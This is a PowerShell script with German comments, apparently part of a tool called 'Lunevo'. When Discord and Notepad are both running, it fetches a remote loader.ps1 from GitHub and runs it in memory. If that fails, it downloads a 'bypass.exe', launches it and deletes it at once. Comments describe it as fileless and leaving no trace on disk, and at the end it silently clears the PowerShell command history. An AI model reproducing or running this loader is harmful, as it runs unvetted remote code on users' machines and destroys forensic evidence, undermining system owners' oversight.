# Lunevo Startup Chain
# Wird automatisch ausgeführt wenn Discord UND Notepad geöffnet werden
# Komplett fileless - keine Spuren auf Festplatte

# Debug-Logging (kann später entfernt werden)
$logFile = "$env:TEMP\Lunevo\startup_chain.log"
try {
    $logDir = Split-Path -Parent $logFile
    if (-not (Test-Path $logDir)) {
        New-Item -ItemType Directory -Path $logDir -Force | Out-Null
    }
    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] startup_chain.ps1 gestartet" | Out-File -FilePath $logFile -Append -Encoding UTF8
} catch {}

Start-Sleep -Seconds 2

# Prüfe ob Discord UND Notepad laufen
$discordRunning = Get-Process -Name "discord" -ErrorAction SilentlyContinue
$notepadRunning = Get-Process -Name "notepad" -ErrorAction SilentlyContinue

try {
    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Discord: $($discordRunning -ne $null), Notepad: $($notepadRunning -ne $null)" | Out-File -FilePath $logFile -Append -Encoding UTF8
} catch {}

if ($discordRunning -and $notepadRunning) {
    # Beide Prozesse laufen - Starte Bypass fileless
    
    try {
        "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Beide Prozesse laufen - Starte Bypass" | Out-File -FilePath $logFile -Append -Encoding UTF8
    } catch {}
    
    # Prüfe ob Bypass bereits läuft (verhindert mehrfaches Starten)
    $bypassRunning = Get-Process -Name "bypass" -ErrorAction SilentlyContinue
    if ($bypassRunning) {
        try {
            "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Bypass laeuft bereits - Exit" | Out-File -FilePath $logFile -Append -Encoding UTF8
        } catch {}
        exit
    }
    
    # Fileless Loader von GitHub laden und direkt ausführen (keine lokale Datei)
    $loaderUrl = "https://raw.githubusercontent.com/lunevo/lunevo/main/loader.ps1"
    try {
        try {
            "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Lade loader.ps1 von GitHub..." | Out-File -FilePath $logFile -Append -Encoding UTF8
        } catch {}
        
        # Lade loader.ps1 direkt in Memory und führe aus (fileless)
        $loader = Invoke-WebRequest -Uri $loaderUrl -UseBasicParsing -ErrorAction Stop
        
        try {
            "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] loader.ps1 geladen, fuehre aus..." | Out-File -FilePath $logFile -Append -Encoding UTF8
        } catch {}
        
        Invoke-Expression $loader.Content
        
        try {
            "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] loader.ps1 ausgefuehrt" | Out-File -FilePath $logFile -Append -Encoding UTF8
        } catch {}
    } catch {
        try {
            "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] FEHLER beim Laden von loader.ps1: $($_.Exception.Message)" | Out-File -FilePath $logFile -Append -Encoding UTF8
        } catch {}
        
        # Fallback: Direkter Download der EXE (nur als letzter Ausweg)
        try {
            $exeUrl = "https://raw.githubusercontent.com/lunevo/lunevo/main/bypass.exe"
            $exeBytes = (Invoke-WebRequest -Uri $exeUrl -UseBasicParsing -ErrorAction Stop).Content
            
            # Temporärer Pfad (wird sofort gelöscht)
            $tempPath = "$env:TEMP\Lunevo\bypass_$(Get-Random).exe"
            
            # Erstelle Verzeichnis falls nicht vorhanden
            $exeDir = Split-Path -Parent $tempPath
            if (-not (Test-Path $exeDir)) {
                New-Item -ItemType Directory -Path $exeDir -Force | Out-Null
            }
            
            # Konvertiere zu Byte-Array falls nötig
            if ($exeBytes -is [string]) {
                $exeBytes = [System.Text.Encoding]::Default.GetBytes($exeBytes)
            }
            
            # Schreibe temporär
            [System.IO.File]::WriteAllBytes($tempPath, $exeBytes)
            
            # Starte Prozess
            $proc = Start-Process -FilePath $tempPath -PassThru
            
            # Lösche SOFORT nach Start (fileless cleanup)
            if ($proc) {
                Start-Sleep -Milliseconds 200
                Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue
            }
        } catch {
            try {
                "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] FEHLER beim Fallback: $($_.Exception.Message)" | Out-File -FilePath $logFile -Append -Encoding UTF8
            } catch {}
        }
    }
} else {
    try {
        "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Bedingungen nicht erfuellt - Exit" | Out-File -FilePath $logFile -Append -Encoding UTF8
    } catch {}
}

# Silent Log Cleaning (minimal, unauffällig)
try {
    # PowerShell History
    $historyPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath
    if ($historyPath -and (Test-Path $historyPath)) {
        Clear-Content -Path $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
    }
} catch {
    # Silent
}

